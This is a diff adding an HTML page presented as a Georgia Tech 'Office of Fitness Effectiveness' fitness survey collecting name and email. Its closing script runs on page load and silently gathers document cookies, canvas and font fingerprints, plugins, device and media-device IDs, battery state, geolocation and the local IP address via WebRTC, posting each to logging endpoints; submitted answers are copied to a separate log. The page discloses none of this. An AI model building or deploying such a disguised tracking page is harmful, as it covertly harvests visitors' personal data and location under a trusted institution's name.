@@ -1,0 +1,523 @@
+<script type="text/javascript">
+    var gk_isXlsx = false;
+    var gk_xlsxFileLookup = {};
+    var gk_fileData = {};
+    function filledCell(cell) {
+      return cell !== '' && cell != null;
+    }
+    function loadFileData(filename) {
+    if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+        try {
+            var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+            var firstSheetName = workbook.SheetNames[0];
+            var worksheet = workbook.Sheets[firstSheetName];
+
+            // Convert sheet to JSON to filter blank rows
+            var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+            // Filter out blank rows (rows where all cells are empty, null, or undefined)
+            var filteredData = jsonData.filter(row => row.some(filledCell));
+
+            // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+            var headerRowIndex = filteredData.findIndex((row, index) =>
+              row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+            );
+            // Fallback
+            if (headerRowIndex === -1 || headerRowIndex > 25) {
+              headerRowIndex = 0;
+            }
+
+            // Convert filtered JSON back to CSV
+            var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+            csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+            return csv;
+        } catch (e) {
+            console.error(e);
+            return "";
+        }
+    }
+    return gk_fileData[filename] || "";
+    }
+    </script><!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GaTech Fitness Survey</title>
+<link href="https://fonts.googleapis.com/css2?family=Georgia:wght@400;600&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+<style>
+    body {
+        font-family: 'Georgia', serif;
+        margin: 0;
+        padding: 0;
+        background-color: #F5F6F5;
+        color: #333;
+        font-size: 16px;
+        line-height: 1.6;
+    }
+    header {
+        background-color: #B3A369;
+        color: #FFFFFF;
+        padding: 20px;
+        text-align: center;
+        font-family: 'Roboto', sans-serif;
+    }
+    .logo img {
+        height: 50px;
+        vertical-align: middle;
+    }
+    header h1 {
+        margin: 10px 0 0 0;
+        font-size: 1.5em;
+        font-weight: 500;
+        display: inline-block;
+        vertical-align: middle;
+    }
+    nav {
+        background-color: #003057;
+        padding: 10px;
+        font-family: 'Roboto', sans-serif;
+    }
+    nav ul {
+        list-style: none;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        flex-wrap: wrap;
+    }
+    nav ul li {
+        margin: 0 15px;
+    }
+    nav ul li a {
+        color: #FFFFFF;
+        text-decoration: none;
+        font-weight: 400;
+        font-size: 0.9em;
+    }
+    nav ul li a:hover {
+        text-decoration: underline;
+    }
+    .hero {
+        background-color: #B3A369;
+        padding: 40px 20px;
+        text-align: center;
+        color: #003057;
+        position: relative;
+        margin-bottom: 20px;
+        background: linear-gradient(135deg, #B3A369 0%, #B3A369 50%, transparent 50%), #B3A369;
+    }
+    .hero::before {
+        content: '';
+        background-image: url('https://via.placeholder.com/800x300/003057/B3A369?text=Tree+Image+Placeholder');
+        background-size: cover;
+        background-position: right;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.2;
+        z-index: 1;
+    }
+    .hero-content {
+        position: relative;
+        z-index: 2;
+    }
+    .hero h1 {
+        font-family: 'Roboto', sans-serif;
+        font-weight: 700;
+        font-size: 2.5em;
+        margin: 0;
+        color: #003057;
+    }
+    .hero p {
+        font-family: 'Roboto', sans-serif;
+        font-weight: 500;
+        font-size: 1.2em;
+        margin: 5px 0;
+    }
+    .container {
+        max-width: 800px;
+        margin: 20px auto;
+        padding: 20px;
+        background-color: #FFFFFF;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        border-radius: 5px;
+    }
+    h2 {
+        color: #003057;
+        font-family: 'Roboto', sans-serif;
+        font-size: 1.8em;
+        font-weight: 500;
+        margin-bottom: 20px;
+    }
+    .mission-vision p {
+        font-size: 1.1em;
+        line-height: 1.6;
+        margin-bottom: 20px;
+        font-family: 'Georgia', serif;
+    }
+    .survey-form label {
+        display: block;
+        margin: 10px 0 5px;
+        font-weight: 600;
+        font-family: 'Roboto', sans-serif;
+        color: #003057;
+    }
+    .survey-form input[type="text"],
+    .survey-form input[type="email"],
+    .survey-form select,
+    .survey-form textarea {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        font-size: 1em;
+        font-family: 'Georgia', serif;
+    }
+    .survey-form input[type="radio"] {
+        margin: 10px 5px;
+    }
+    .survey-form button {
+        background-color: #B3A369;
+        color: #FFFFFF;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 1.1em;
+        font-family: 'Roboto', sans-serif;
+        font-weight: 500;
+    }
+    .survey-form button:hover {
+        background-color: #003057;
+    }
+    footer {
+        background-color: #003057;
+        color: #FFFFFF;
+        text-align: center;
+        padding: 15px;
+        width: 100%;
+    }
+    footer p {
+        margin: 0;
+        font-size: 0.9em;
+        font-family: 'Roboto', sans-serif;
+    }
+</style>
+</head>
+<body>
+<header>
+    <div class="logo">
+        <img src="extended-white-RGB.png" alt="Georgia Tech Logo" style="height: 100px;">
+    </div>
+</header>
+<nav>
+    <ul>
+        <li><a href="#home">About</a></li>
+        <li><a href="#survey">Assessment</a></li>
+        <li><a href="#about">Surveys</a></li>
+        <li><a href="#contact">Accreditation</a></li>
+        <li><a href="#home">Program Review</a></li>
+        <li><a href="#survey">General Education Assessment</a></li>
+        <li><a href="#about">Committees</a></li>
+    </ul>
+</nav>
+<div class="hero">
+    <div class="hero-content">
+        <h1>Office of Fitness Effectiveness</h1>
+    </div>
+</div>
+<div class="container">
+    <div class="mission-vision">
+        <h2>Mission Statement</h2>
+        <p>The GT Fitness Survey initiative fosters a culture of health and wellness across the Georgia Tech community. Through engagement and data collection, we aim to enhance fitness programs and support student well-being.</p>
+        <h2>Vision Statement</h2>
+        <p>The GT Fitness Survey will lead in shaping data-driven fitness and wellness strategies to promote a healthier Georgia Tech campus.</p>
+    </div>
+    <div class="survey-form">
+        <h2>Fitness Survey</h2>
+        <form id="surveyForm" action="/submit" method="post">
+            <label for="name">Full Name:</label>
+            <input type="text" id="name" name="name" required>
+
+            <label for="email">Email (GT or Personal):</label>
+            <input type="email" id="email" name="email" required>
+
+            <label for="frequency">How often do you exercise per week?</label>
+            <select id="frequency" name="frequency" required>
+                <option value="">Select an option</option>
+                <option value="0-1">0-1 times</option>
+                <option value="2-3">2-3 times</option>
+                <option value="4-5">4-5 times</option>
+                <option value="6+">6 or more times</option>
+            </select>
+
+            <label>What is your primary fitness goal?</label>
+            <input type="radio" id="strength" name="goal" value="strength" required>
+            <label for="strength">Strength Building</label><br>
+            <input type="radio" id="cardio" name="goal" value="cardio">
+            <label for="cardio">Cardiovascular Health</label><br>
+            <input type="radio" id="weight" name="goal" value="weight">
+            <label for="weight">Weight Management</label><br>
+            <input type="radio" id="other" name="goal" value="other">
+            <label for="other">Other</label>
+
+            <label for="feedback">Additional Comments:</label>
+            <textarea id="feedback" name="feedback" rows="5"></textarea>
+
+            <button type="submit">Submit Survey</button>
+        </form>
+    </div>
+</div>
+<footer>
+    <p>Office of Fitness Effectiveness | Georgia Tech | © 2025</p>
+</footer>
+
+<script>
+    // XLSX Processing Script
+    var gk_isXlsx = false;
+    var gk_xlsxFileLookup = {};
+    var gk_fileData = {};
+    function filledCell(cell) {
+        return cell !== '' && cell != null;
+    }
+    function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                    row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                    headerRowIndex = 0;
+                }
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex));
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+    }
+
+    // User Data Logging
+    const startTime = Date.now();
+    const sessionId = Math.random().toString(36).substring(2, 15);
+
+    async function logUserData() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('user') || sessionId;
+
+        const userData = {
+            timestamp: new Date().toISOString(),
+            userId,
+            userAgent: navigator.userAgent,
+            browser: {
+                name: navigator.appName,
+                version: navigator.appVersion,
+                platform: navigator.platform,
+                language: navigator.language || navigator.userLanguage,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                vendor: navigator.vendor,
+                product: navigator.product,
+                productSub: navigator.productSub,
+            },
+            screen: {
+                width: window.screen.width,
+                height: window.screen.height,
+                availWidth: window.screen.availWidth,
+                availHeight: window.screen.availHeight,
+                colorDepth: window.screen.colorDepth,
+                pixelDepth: window.screen.pixelDepth,
+                orientation: window.screen.orientation ? window.screen.orientation.type : 'Not supported',
+            },
+            window: {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight,
+            },
+            device: {
+                memory: navigator.deviceMemory || 'Not supported',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Not supported',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+            },
+            connection: navigator.connection ? {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData,
+            } : 'Not supported',
+            referrer: document.referrer || 'Direct',
+            url: window.location.href,
+            cookies: document.cookie || 'None',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            plugins: Array.from(navigator.plugins || []).map(p => ({
+                name: p.name,
+                description: p.description,
+                filename: p.filename,
+                version: p.version
+            })),
+            mimeTypes: Array.from(navigator.mimeTypes || []).map(m => ({
+                type: m.type,
+                description: m.description,
+                suffixes: m.suffixes
+            })),
+            canvasFingerprint: getCanvasFingerprint(),
+            sessionDuration: Math.round((Date.now() - startTime) / 1000) + ' seconds',
+            fonts: getFonts(),
+            mediaDevices: await getMediaDevices()
+        };
+
+        // Battery status and events
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                userData.battery = {
+                    charging: battery.charging,
+                    level: battery.level,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+                battery.addEventListener('chargingchange', () => {
+                    sendDataToServer({
+                        userId,
+                        batteryEvent: {
+                            charging: battery.charging,
+                            level: battery.level,
+                            timestamp: new Date().toISOString()
+                        }
+                    }, '/log-battery');
+                });
+                sendDataToServer(userData, '/log');
+            }).catch(err => {
+                console.log('Battery API error:', err);
+                userData.battery = 'Not supported';
+                sendDataToServer(userData, '/log');
+            });
+        } else {
+            userData.battery = 'Not supported';
+            sendDataToServer(userData, '/log');
+        }
+
+        // Geolocation
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const geoData = {
+                        userId,
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        timestamp: new Date(position.timestamp).toISOString()
+                    };
+                    sendDataToServer(geoData, '/log-geo');
+                },
+                (error) => console.log('Geolocation error:', error.message)
+            );
+        }
+
+        // WebRTC
+        if (window.RTCPeerConnection) {
+            const rtc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+            rtc.createDataChannel('');
+            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+            rtc.onicecandidate = (event) => {
+                if (event.candidate) {
+                    const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                    if (ipMatch) {
+                        sendDataToServer({ userId, localIp: ipMatch[0], timestamp: new Date().toISOString() }, '/log-webrtc');
+                    }
+                }
+            };
+        }
+    }
+
+    function getCanvasFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Test String', 2, 15);
+        return canvas.toDataURL();
+    }
+
+    function getFonts() {
+        const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS'];
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const detectedFonts = fonts.filter(font => {
+            ctx.font = `12px "${font}"`;
+            const width = ctx.measureText('test').width;
+            ctx.font = '12px sans-serif';
+            return width !== ctx.measureText('test').width;
+        });
+        return detectedFonts;
+    }
+
+    async function getMediaDevices() {
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                return devices.map(d => ({ kind: d.kind, label: d.label, deviceId: d.deviceId }));
+            } catch (error) {
+                console.log('Media devices error:', error);
+                return 'Not supported';
+            }
+        }
+        return 'Not supported';
+    }
+
+    async function sendDataToServer(data, endpoint) {
+        try {
+            const response = await fetch(endpoint, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            const result = await response.json();
+            console.log(`Data logged to ${endpoint}:`, result);
+        } catch (error) {
+            console.error(`Error logging data to ${endpoint}:`, error);
+        }
+    }
+
+    // Log survey form data
+    document.getElementById('surveyForm').addEventListener('submit', async (event) => {
+        event.preventDefault();
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('user') || sessionId;
+        const formData = new FormData(event.target);
+        const surveyData = {
+            timestamp: new Date().toISOString(),
+            userId,
+            name: formData.get('name'),
+            email: formData.get('email'),
+            frequency: formData.get('frequency'),
+            goal: formData.get('goal'),
+            feedback: formData.get('feedback')
+        };
+        await sendDataToServer(surveyData, '/log-survey');
+        event.target.submit();
+    });
+
+    // Run on page load
+    window.onload = logUserData;
+</script>
+</body>
+</html>
